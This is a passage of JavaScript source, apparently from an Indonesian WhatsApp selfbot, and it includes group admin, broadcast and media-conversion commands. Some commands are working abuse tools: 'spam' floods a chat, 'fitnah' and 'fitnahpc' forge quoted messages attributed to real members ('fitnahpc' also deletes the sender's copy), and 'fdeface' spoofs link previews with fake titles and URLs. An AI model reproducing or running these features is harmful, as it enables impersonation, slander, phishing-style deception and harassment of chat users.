                           },
						   {
                              "title": "group close",
                              "rowId": `group close`
                           }
                        ]
                     }]}}, {}) 
            alpha.relayWAMessage(po, {waitForAck: true})
break

            case prefix+'mystat': 
			case prefix+'mystatus':
				
                anu = process.uptime()
                teskny = `∆ *MY STATS*
*├❒ V. Whatsapp :* ${wa_version}
*├❒ RAM :* ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB
*├❒ MCC :* ${mcc}
*├❒ MNC :* ${mnc}
*├❒ Versi OS :* ${os_version}
*├❒ Merk HP :* ${device_manufacturer}
*├❒ Versi HP :* ${device_model}
*├❒ Group Chat :* ${giid.length}
*├❒ Personal Chat :* ${totalchat.length - giid.length}
*├❒ Total Chat :* ${totalchat.length}
*├❒ Speed :* ${latensii.toFixed(4)} Second
*└❒ Runtime :* ${kyun(anu)}`
				alpha.sendMessage(from, teskny, text, {quoted: { key : { participant : `0@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`), "mimetype": "application/octet-stream","title": `${setting.fake}`, "fileLength": "36", "pageCount": 0, "fileName": `${setting.fake}`}}, "messageTimestamp": "1614069378", "status": "PENDING"},contextInfo:{"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
break
case prefix+ 'getbio':
				if (!isGroup) return reply('```ONLY GROUP```')
				if (args.length < 1) return reply('```TAG ORANGNYA```')
                mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
                const p = await alpha.getStatus(`${mentioned}`, MessageType.text)
                reply(p.status)
                if (p.status == 401) {
                reply("Error! mungkin diprivate")
                }
                break
/*case 'creategroup':
case 'creategrup':
			    if (!isGroup) return reply('```ONLY GROUP```')
				if (args.length < 1) return reply(`Penggunaan ${prefix}creategrup nama grup|@tag member`)
				argza = arg.split('|')
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                    for (let i = 0; i < mentioned.length; i++){
						anu = []
						anu.push(mentioned[i])
                    }
					alpha.groupCreate(argza[0], anu)
					reply(`Sukes membuat grup:\n${argza}`)
                }
				break*/
		case prefix+'sc':
		case prefix+ 'source':
		case prefix+ 'sourcecode':
			        source =`Source Script Bot : bit.ly/ytzeeoneofc`
					alpha.sendMessage(from, source, text, {quoted: { key : { participant : `0@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`), "mimetype": "application/octet-stream","title": `${setting.fake}`, "fileLength": "36", "pageCount": 0, "fileName": `${setting.fake}`}}, "messageTimestamp": "1614069378", "status": "PENDING"},contextInfo:{"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
					break
		    case prefix+'searchmsg':
		    case prefix+'caripesan':
		    case prefix+'searchmessage':
				if (!q) return reply(`Penggunaan ${command} _nama pesannya_\n\nContoh \n --> ${command} halo`)
				reply(mess.wait)
				 xtext = args.join(' ')
				                cond = xtext.split(" ")
				                 a = await alpha.searchMessages(xtext, from, 10, 1)// count 10 
				                 fox = '*「 Message Search 」*\n\n'
				                num = 0
				                for (j of a.messages){
				                    num += 1
				                    if (j.message.conversation) {
				                        if (j.key.fromMe){ 
				                            fox += num+'. Sender : '+alpha.user.jid+'\n    Msg : '+j.message.conversation+'\n    MsgID : '+j.key.id+'\n    Type : conversation\n\n'
				                        }else{
				                            fox += num+'. Sender : '+j.key.participant+'\n    Msg : '+j.message.conversation+'\n    MsgID : '+j.key.id+'\n    Type : conversation\n\n'
				                        } 
				                    }
				                    else if (j.message.extendedTextMessage){
				                        if (j.key.fromMe){ 
				                            fox += num+'. Sender : '+alpha.user.jid+'\n    Msg : '+j.message.extendedTextMessage.text+'\n    MsgID : '+j.key.id+'\n    Type : extendedTextMessage\n\n'
				                        }else{
				                            fox += num+'. Sender : '+j.key.participant+'\n    Msg : '+j.message.extendedTextMessage.text+'\n    MsgID : '+j.key.id+'\n    Type : extendedTextMessage\n\n'
				                        } 
				                    }
				                }
				                reply(fox)
		                break
case prefix+'setname':
					if (!isGroup) return reply('```ONLY GROUP```')
					if (!isGroupAdmins) return reply('```ONLY ADMIN GROUP```')
					if (!isBotGroupAdmins) return reply('```Saya Bukan Admin```')
					alpha.groupUpdateSubject(from, `${body.slice(9)}`)
					alpha.sendMessage(from, '「  SUKSES  」Mengubah Nama Grup', text, { quoted: fgclink })
					break 
case prefix+'setdesc':
					if (!isGroup) return reply('```ONLY GROUP```')
					if (!isGroupAdmins) return reply('```ONLY ADMIN GROUP```')
					if (!isBotGroupAdmins) return reply('```Saya Bukan Admin```')
					alpha.groupUpdateDescription(from, `${body.slice(9)}`)
					alpha.sendMessage(from, '*「  SUKSES  」Mengubah Desk Grup', text, { quoted: fgclink })
					break   
case prefix+'spam':
				if (args.length < 1) return reply(`Penggunaan ${prefix}spam teks|jumlahspam`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					alpha.sendMessage(from, argzi[0], MessageType.text)
				}
				break 
case prefix+'readall':
					if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
					var chats = await alpha.chats.all()
                    chats.map( async ({ jid }) => {
                          await alpha.chatRead(jid)
                    })
					rdl = `Berhasil membaca ${chats.length} Chat !`
					await alpha.sendMessage(from, rdl, MessageType.text, {quoted: fvideo})
					console.log(chats.length)
					break
case prefix+'listpc':
					  if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
					  cpcp = await getpc(totalchat)
					  teks = `*L I S T  P E R S O N A L  C H A T*\nJumlah PC: ${cpcp.length}\n\n`
					  for(let i=0; i<cpcp.length; i++){
						conts = mek.key.fromMe ? mek.user.jid : alpha.contacts[cpcp[i]] || {notify: jid.replace(/@.+/, '')}
						pushnama = alpha.contacts[cpcp[i]] != undefined ? alpha.contacts[cpcp[i]].vname || alpha.contacts[cpcp[i]].notify : undefined
						teks += `• Nama : ${pushnama}\n• Tag : @${cpcp[i].split("@")[0]}\n• Wa.me : wa.me/${cpcp[i].split("@")[0]}\n\n----------------------------------\n\n`
					}
					mentions( teks, cpcp, true)
					break 
case prefix+'listgroup':
				  if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
				  ingfoo = await getGroup(totalchat)
				  teks1 = `*L I S T  G R O U P*\nJumlah Grup: ${ingfoo.length}\n\n`
				   for (let i = 0; i < ingfoo.length; i++){
				   teks1 += `• Nama grup : ${ingfoo[i].subject}\n• ID grup : ${ingfoo[i].id}\n• Dibuat : ${moment(`${ingfoo[i].creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n• Jumlah Peserta : ${ingfoo[i].participants.length}\n\n`
				   }
				   reply(teks1)
				   break 
case prefix+'bcsticker':
case prefix+'bcstik':
					if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await alpha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							alpha.sendMessage(_.jid, bc, sticker, {quoted:ftroli})
						}
						fakestatus('Suksess broadcast')
					}
					break
case prefix+'bcvideo':
					if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
					if (args.length < 1) return reply('.......')
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await alpha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							alpha.sendMessage(_.jid, bc, video, {mimetype: 'video/mp4', duration: 359996400,quoted: ftoko,caption: `[ *${setting.botname} BROADCAST* ]\n\n${body.slice(9)}`})
						}
						fakestatus('Suksess broadcast')
					}
					break
	case prefix+'bcaudio':
					if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
					if (args.length < 1) return reply('.......')
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.audioMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await alpha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							alpha.sendMessage(_.jid, bc, audio, {mimetype :  'audio/mp4' , duration : 359996400, ptt : true,quoted: ftoko,caption: `[ *${setting.botname} BROADCAST* ]\n\n${body.slice(9)}`})
						}
						fakestatus('Suksess broadcast')
					}
					break
case prefix+'bcgif':
					if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
					if (args.length < 1) return reply('.......')
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await alpha.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							alpha.sendMessage(_.jid, bc, sticker, {mimetype: Mimetype.gif,quoted : ftroli,caption: `[ *${setting.botname} BROADCAST* ]\n\n${body.slice(7)}`})
						}
						fakestatus('Suksess broadcast')
					}
					break
/*++++++++++++++++++++++++++
+++++++++MENU BARU++++++++
+++++++++++++++++++++++++++*/

        case prefix+'owner':  
        case prefix+'creator':  
                    members_ids = []
		            for (let mem of groupMembers) {
		            members_ids.push(mem.jid)
		            }
		            vcard2 = 'BEGIN:VCARD\n'
		            + 'VERSION:3.0\n'
		            + `FN:${setting.ownername}\n`
		            + `ORG: SUBSCRIBE ZEEONE OFC;\n`
		            + `TEL;type=CELL;type=VOICE;waid=${setting.ownerNumber}:${setting.ownerNumberr}\n`
		            + 'END:VCARD'.trim()
		            alpha.sendMessage(from, {displayName: `${setting.ownername}`, vcard: vcard2}, contact, { quoted: fkontak, contextInfo: {"mentionedJid": members_ids}})
		           .then((res) => alpha.sendMessage(from, 'Nih kontak ownerku', text, {quoted: mek}))
		            break
                
                case prefix+'sider':
                shape = '✓ '
infom = await alpha.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
tagg = []
teks = `Telah Dibaca Oleh :\n\n`
for(let i of infom.reads){
teks += shape+' ' + '@' + i.jid.split('@')[0] + '\n'
teks += `--> ${shape} Waktu : ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
tagg.push(i.jid)
}
mentions(teks, tagg, true)
break
			
                
             case 'fakeloc':
               var kntl = body.slice(8)
			   var nama = kntl.split("|")[0];
			   var impostor = kntl.split("|")[1];
			   var bro = fs.readFileSync(`image/${thumbnail}`)
               alpha.sendMessage(from, { name: `${nama}`,address: `${impostor}`,jpegThumbnail: bro }, MessageType.location)
                 
		    break
		    case prefix+ 'on':
		            if (!mek.key.fromMe) return 
		            offline = false
		            fakeitem(' ```ANDA TELAH ONLINE``` ')
		            break       
		    case prefix+ 'status':
		            fakeitem(`*STATUS*\n${offline ? '> OFFLINE' : '> ONLINE'}\n${banChats ? '> SELF-MODE' : '> PUBLIC-MODE'}`)
		            break
		    case prefix+ 'off':
		            if (!mek.key.fromMe) return 
		            offline = true
		            waktu = Date.now()
		            anuu = args.join(' ') ? args.join(' ') : '-'
		            alasan = anuu
		            fakeitem(' ```ANDA TELAH OFFLINE``` ')
		            break   
		    case prefix+ 'get':
		            if(!q) return reply('linknya?')
		            fetch(`${args[0]}`).then(res => res.text())  
		            .then(bu =>{
		            fakestatus(bu)
		            })   
		            break
		    case prefix+ 'kontag':
		
		            pe = args.join('')
		            entah = pe.split('|')[0]
		            nah = pe.split('|')[1]
		            if (isNaN(entah)) return reply('Invalid phone number');
		            members_ids = []
		            for (let mem of groupMembers) {
		            members_ids.push(mem.jid)
		            }
		            vcard = 'BEGIN:VCARD\n'
		            + 'VERSION:3.0\n'
		            + `FN:${nah}\n`
		            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
		            + 'END:VCARD'.trim()
		            alpha.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact, {contextInfo: {"mentionedJid": members_ids}})
		            break
		    case prefix+ 'sticktag':
		            if (!isGroupAdmins) return reply('```ONLY ADMIN GROUP```')
		            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
		            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, sticker, options)
		            fs.unlinkSync(file)
		            } else {
		            fakegroup(`*Reply sticker yang sudah dikirim*`)
		            }
		            break
		    case prefix+ 'totag':
		            if (!isGroupAdmins) return reply('```ONLY ADMIN GROUP```')
		            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
		            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, sticker, options)
		            fs.unlinkSync(file)
		            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
		            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, image, options)
		            fs.unlinkSync(file)
		        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
		            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		            	mimetype : 'audio/mp4',
		            	ptt : true,
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, audio, options)
		            fs.unlinkSync(file)
		        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
		            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            file = await alpha.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
		            value = args.join(" ")
		            var group = await alpha.groupMetadata(from)
		            var member = group['participants']
		            var mem = []
		            member.map(async adm => {
		            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
		            })
		            var options = {
		            	mimetype : 'video/mp4',
		                contextInfo: { mentionedJid: mem },
		                quoted: mek
		            }
		            ini_buffer = fs.readFileSync(file)
		            alpha.sendMessage(from, ini_buffer, video, options)
		            fs.unlinkSync(file)
		        } else{
		          fakestatus(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
		        }
		        break
		    case prefix+ 'fitnah':
		            if (args.length < 1) return fakegroup(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
		            var gh = args.join('')
		            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
		            var replace = gh.split("|")[0];
		            var target = gh.split("|")[1];
		            var bot = gh.split("|")[2];
		            alpha.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
		            break
		    case prefix+ 'settarget':
		            if(!q) return fakegroup(`${prefix}settarget 628xxxxx`)
		            targetpc = args[0]
		            fakegroup(`Succes Mengganti target fitnahpc : ${targetpc}`)
		            break
		    case prefix+ 'fitnahpc':
		            if(!q) return fakegroup(`${prefix}fitnahpc teks target|teks lu`)
		            jids = `${targetpc}@s.whatsapp.net` // nomer target
		            var split = args.join(' ').replace(/@|\d/gi, '').split('|')
		            var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
		            var options = {contextInfo: {quotedMessage: {extendedTextMessage: {text: split[0]}}}}
		            const responye = await alpha.sendMessage(jids, `${split[1]}`, MessageType.text, options)
		            await alpha.deleteMessage(jids, { id: responye.messageID, remoteJid: jids, fromMe: true })
		            break
		    case prefix+ 'tomp3':
		            if (!isQuotedVideo) return fakegroup('```Reply videonya!```')
		            fakegroup(mess.wait)
		            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            media = await alpha.downloadAndSaveMediaMessage(encmedia)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media} ${ran}`, (err) => {
		            fs.unlinkSync(media)
		            if (err) return fakegroup(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            alpha.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: mek })
		            fs.unlinkSync(ran)
		            })
		            break
		    case prefix+ 'fast':
		            if (!isQuotedVideo) return fakegroup('Reply videonya!')
		            fakegroup(mess.wait)
		            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            media = await alpha.downloadAndSaveMediaMessage(encmedia)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
		            fs.unlinkSync(media)
		            if (err) return fakegroup(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            alpha.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
		            fs.unlinkSync(ran)
		            })
		            break
		    case prefix+ 'slow':
		            if (!isQuotedVideo) return fakegroup('Reply videonya!')
		            fakegroup(mess.wait)
		            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            media = await alpha.downloadAndSaveMediaMessage(encmedia)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
		            fs.unlinkSync(media)
		            if (err) return fakegroup(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            alpha.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
		            fs.unlinkSync(ran)
		            })
		            break
		    case prefix+ 'reverse':
		            if (!isQuotedVideo) return fakegroup('```Reply videonya!```')
		            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            media = await alpha.downloadAndSaveMediaMessage(encmedia)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
		            fs.unlinkSync(media)
		            if (err) return fakegroup(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            alpha.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
		            fs.unlinkSync(ran)
		            })
		            break
		    case prefix+ 'anime':
		            fakegroup('```BENTAR```')
		            fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
		            .then(res => res.text())
		            .then(body => {
		            let tod = body.split("\n");
		            let pjr = tod[Math.floor(Math.random() * tod.length)];
		            imageToBase64(pjr)
		            .then((response) => {
		            media =  Buffer.from(response, 'base64');
		            alpha.sendMessage(from,media,image,{quoted:mek,caption:'Dasar wibu. Nih!!!\nJgn lupa sub YT : ZEEONE OFC'})
		            }
		            )
		            .catch((error) => {
		            console.log(error); 
		            }
		            )
		            });
		            break
		    case prefix+ 'kontak':
		            pe = args.join(' ') 
		            entah = pe.split('|')[0]
		            nah = pe.split('|')[1]
		            if (isNaN(entah)) return reply('Invalid phone number');
		            vcard = 'BEGIN:VCARD\n'
		            + 'VERSION:3.0\n'
		            + `FN:${nah}\n`
		            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
		            + 'END:VCARD'.trim()
		            alpha.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact)
		            break    
		    case prefix+ 'take':
		    case prefix+ 'colong':
		    		if (!isQuotedSticker) return reply('Stiker aja om')
		            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
				    media = await alpha.downloadAndSaveMediaMessage(encmedia)
		            anu = args.join(' ').split('|')
		            satu = anu[0] !== '' ? anu[0] : `YT GUA`
		            dua = typeof anu[1] !== 'undefined' ? anu[1] : `ZEEONE OFC`
		            require('./lib/fetcher.js').createExif(satu, dua)
					require('./lib/fetcher.js').modStick(media, alpha, mek, from)
					break
			case prefix+ 'stikerwm':
			case prefix+ 'stickerwm':
		    case prefix+ 'swm':
		            pe = args.join('')
		            var a = pe.split("|")[0];
		            var b = pe.split("|")[1];
		            if (isMedia && !mek.message.videoMessage || isQuotedImage ) {
		            const encmedia = isQuotedImage   ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
		             media = await alpha.downloadAndSaveMediaMessage(encmedia)
		            await createExif(a,b)
		            out = getRandom('.webp')
		            ffmpeg(media)
		            .on('error', (e) => {
		            console.log(e)
		            alpha.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
		            fs.unlinkSync(media)
		            })
		            .on('end', () => {
		            _out = getRandom('.webp')
		            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
		            .on('exit', () => {
		            alpha.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
		            fs.unlinkSync(out)
		            fs.unlinkSync(_out)
		            fs.unlinkSync(media)
		            })
		            })
		            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
		            .toFormat('webp')
		            .save(out) 
		            } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
		            const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
		            const media = await alpha.downloadAndSaveMediaMessage(encmedia)
		            pe = args.join('')
		            var a = pe.split("|")[0];
		            var b = pe.split("|")[1];
		            await createExif(a,b)
		            out = getRandom('.webp')
		            ffmpeg(media)
		            .on('error', (e) => {
		            console.log(e)
		            alpha.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
		            fs.unlinkSync(media)
		            })
		            .on('end', () => {
		            _out = getRandom('.webp')
		            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
		            .on('exit', () => {
		            alpha.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
		            fs.unlinkSync(out)
		            fs.unlinkSync(_out)
		            fs.unlinkSync(media)
		            })
		            })
		            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
		            .toFormat('webp')
		            .save(out)       
		            } else {
		            fakestatus(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
		            }
		            break
		    case prefix+ 'upswteks':
		            if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
		            if (!q) return fakestatus('Isi teksnya!')
		            alpha.sendMessage('status@broadcast', `${q}`, extendedText)
		            fakeitem(`Sukses Up story wea teks ${q}`)
		            break
		    case prefix+ 'upswimage':
		            if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
		            if (isQuotedImage) {
		            const swsw = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            cihcih = await alpha.downloadMediaMessage(swsw)
		            alpha.sendMessage('status@broadcast', cihcih, image, { caption: `${q}` })
		            bur = `Sukses Upload Story Image dengan Caption: ${q}`
		            alpha.sendMessage(from, bur, text, { quoted: mek })
		            } else {
		            fakegroup('```Reply gambarnya!```')
		            }
		            break
		    case prefix+ 'upswvideo':
		            if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
		            if (isQuotedVideo) {
		            const swsw = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		            cihcih = await alpha.downloadMediaMessage(swsw)
		            alpha.sendMessage('status@broadcast', cihcih, video, { caption: `${q}` }) 
		            bur = `Sukses Upload Story Video dengan Caption: ${q}`
		            alpha.sendMessage(from, bur, text, { quoted: mek })
		            } else {
		            fakegroup('```Reply videonya!```')
		            }
		            break
		    case prefix+ 'fdeface':
		            ge = args.join('')           
		            var pe = ge.split("|")[0];
		            var pen = ge.split("|")[1];
		            var pn = ge.split("|")[2];
		            var be = ge.split("|")[3];
		            const fde = `kirim/reply image dengan capion ${prefix}fdeface link|title|desc|teks`
		            if (args.length < 1) return reply (fde)
		            const dipes = isQuotedSticker || isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
		            const tipes = await alpha.downloadAndSaveMediaMessage(dipes)        
		            const bufer = fs.readFileSync(tipes)
		            const desc = `${pn}`
		            const title = `${pen}`
		            const url = `${pe}`
		            const buu = `https://${be}`
		    		var anu = {
		        	detectLinks: false
		    		}
		    		var mat = await alpha.generateLinkPreview(url)
		    		mat.title = title;
		    		mat.description = desc;
		    		mat.jpegThumbnail = bufer;
		   			mat.canonicalUrl = buu; 
		    		alpha.sendMessage(from, mat, MessageType.extendedText, anu)
		            break
		    case prefix+ 'public':
		              if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
		          	if (banChats === false) return
		          	banChats = false
		          	fakeitem(`「 *PUBLIC-MODE* 」`)
		          	break
			case prefix+ 'self':
			          if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
		          	if (banChats === true) return
		          	uptime = process.uptime()
		         	 banChats = true
		          	fakeitem(`「 *SELF-MODE* 」`)
		          	break
		 	case prefix+ 'hidetag':
		     case prefix+ '_`':
		     case prefix+ '.':
					if (!isGroup) return fakegroup('```ONLY GRUP LORD```')
					if (!isGroupAdmins) return reply('```ONLY ADMIN GROUP```')
					var value = args.join(' ')
					var group = await alpha.groupMetadata(from)
					var member = group['participants']
					var mem = []
					member.map(async adm => {
					mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var optionshidetag = {
					text: value,
					contextInfo: { mentionedJid: mem },
					quoted: mek
					}
					alpha.sendMessage(from, optionshidetag, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "393470602054-1351628616@g.us" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": `${setting.fake}`, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`)} }  } })
					break
			case prefix+ 'play':
					if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
		            var srch = args.join('')
		    		aramas = await yts(srch);
		    		aramat = aramas.all 
		   			var mulaikah = aramat[0].url							
		                  try {
		                    yta(mulaikah)
		                    .then((res) => {
